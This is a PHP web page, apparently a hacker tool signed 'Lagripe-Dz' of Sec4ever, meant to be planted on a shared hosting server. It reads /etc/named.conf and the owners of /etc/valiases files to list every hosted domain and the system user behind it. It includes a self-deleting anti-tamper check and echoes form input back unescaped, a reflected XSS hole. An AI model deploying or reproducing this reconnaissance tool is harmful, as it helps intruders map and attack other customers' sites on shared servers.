<html>
<head>
<title>Local DOMAIN:USER Show | by [ Lagripe-Dz ]</title>
<style>*{ font-family:tahoma; font-size:12; } td,tr{ text-align:center;}</style>
</head>

<body>
<center>
<p>Local DOMAIN:USER Show | by [ Lagripe-Dz ]</p>
<p>[ <a href='?ShowAll'>Show All</a> ] - [ <a href='?UserDomains'>User Domains</a> ] - [ <a href='?DomainUser'>Domain User</a> ]</p>
<?

$file = @implode(@file("/etc/named.conf"));

if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }

preg_match_all("#named/(.*?).db#",$file ,$r);

$domains = array_unique($r[1]);

check();

if(isset($_GET['ShowAll'])){

echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <b>".count($domains)."</b> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td></tr>";

foreach($domains as $domain){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));

echo "<tr><td>$domain</td><td>".$user['name']."</td></tr>";

}

echo "</table>";

}

if(isset($_GET['UserDomains'])){

echo "
<form action='?UserDomains' method='GET'>
<input type=hidden name=UserDomains value=1>
User : <input type=text name=user value=$_GET[user]> - <input type=submit value=Show>
</form>
";

if(isset($_GET['user'])){
echo "<table border=1 width=30% cellpadding=5>
<tr><td><b>Domains ..</b></td></tr>";
foreach($domains as $n=>$domain){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
echo ($_GET['user'] ==  $user['name']) ? "<tr><td>$domain</td></tr>":"";
}
echo "</table>";
}

}


if(isset($_GET['DomainUser'])){

echo "
<form action='?DomainUser' method='GET'>
<input type=hidden name=DomainUser value=1>
Domain : <input type=text name=domain value=$_GET[domain]> - <input type=submit value=Show>
</form>
";

if(isset($_GET['domain'])){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$_GET['domain']));
echo "User is : [ ".$user['name']." ]";
}
}

function check(){(@count(@explode('ip',@implode(@file(__FILE__))))!=6) ?@unlink(__FILE__):"";}

?>

<p><a href="http://www.Sec4ever.com/">www.Sec4ever.com</a> | <a href="http://www.Lagripe-Dz.org/">
www.Lagripe-Dz.org</a><br> Algeria 2o1o-2o11</p>
</body>
</html>